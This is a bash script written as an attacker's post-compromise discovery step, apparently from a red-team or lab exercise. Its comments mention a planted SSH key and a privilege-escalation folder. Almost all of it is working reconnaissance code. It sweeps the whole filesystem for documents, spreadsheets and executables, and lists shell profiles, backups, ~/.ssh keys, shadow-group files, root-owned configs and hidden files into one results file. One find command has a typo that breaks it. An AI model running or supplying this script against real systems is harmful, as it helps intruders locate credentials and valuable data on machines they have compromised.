#!/bin/bash
#assuming attacker is already aware of the valuable research data hosted on the target server. hence it targets .docx and .xslx files
echo -e "[+] Start File and Directory Discovery...\n"
echo -e "[+] Current Directory: $PWD \n"

echo -e "[+] Errors (if any): \n"


#del any old results
rm -f fndd-stripped.txt
#for the following /home/<user>/ dir discovery, it is assumed that the user list has already been previously discovered by the attacker through reconnaissance
#hence this file and dir discovery script has been designed to search specific the specific user, resch dir

#create the txt to sort the results
touch fndd-stripped.txt
#common file extensions; png, jpg, mp3, txt, pdf, doc, xls
# echo -e "\nExtension Type 01: Documents \n" >> fndd-stripped.txt
find / -name "*.doc" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.docx" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.pdf" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.pptx" -printf "%p\n" >> fndd-stripped.txt
# echo -e "\nExtension Type 02: Excel sheets \n" >> fndd-stripped.txt
find /-name "*.xls" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.xlsx" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.csv" -printf "%p\n" >> fndd-stripped.txt
# echo -e "\nExtension Type 03: Media \n" >> fndd-stripped.txt
find / -name "*.png" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.jpg" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.jpeg" -printf "%p\n" >> fndd-stripped.txt
find / -name "*.mp3" -printf "%p\n" >> fndd-stripped.txt
# echo -e "\nExtension Type 04: txt \n" >> fndd-stripped.txt
find /  -name "*.txt" -printf "%p\n" >> fndd-stripped.txt


# echo -e "----------------------------executables files with 700 permission in home dir----------------------------\n" >> fndd-stripped.txt
find / -type f -executable -perm /700 -printf "%p\n" >> fndd-stripped.txt

#/etc/profile, ~/.bash_profile, ~/.bash_login, ~/.profile. /home/user/.bashrc, /etc/bash.bashrc, /etc/profile.d/.
# echo -e "----------------------------files in bash----------------------------\n" >> fndd-stripped.txt
find ~/ -name ".bash*" -printf "%p\n" >> fndd-stripped.txt
find ~/ -name ".profile*" -printf "%p\n" >> fndd-stripped.txt

#backup folder 
# echo -e "----------------------------backups folder----------------------------\n" >> fndd-stripped.txt
ls -R /var/backups/* >> fndd-stripped.txt

#.ssh folder, if there are any other ssh keys than the one planted for initial access
# echo -e "-----------------------------.ssh backup key ls----------------------------\n" >> fndd-stripped.txt
ls -R ~/.ssh/* >> fndd-stripped.txt

#check location and if /etc/shaodow and /etc/passwd exists
# echo -e "----------------------------shadow files and config with root permission---------------------------\n" >> fndd-stripped.txt
find /etc/ -group shadow -printf "%p\n" >> fndd-stripped.txt
find /etc/ -user root -name "*.conf" -printf "%p\n" >> fndd-stripped.txt
find /etc/ -user resch -name "*.conf" -printf "%p\n" >> fndd-stripped.txt

#hidden folders
# echo -e "----------------------------all hidden file/folder----------------------------\n" >> fndd-stripped.txt
find / -name ".*" -maxdepth 5 2> /dev/null >> fndd-stripped.txt


# echo -e "----------------------------folder created for PEexploit----------------------------\n" >> fndd-stripped.txt
ls -R /var/research/* >> fndd-stripped.txt

echo -e "\n[+]End of File and Directory Discovery.\n"


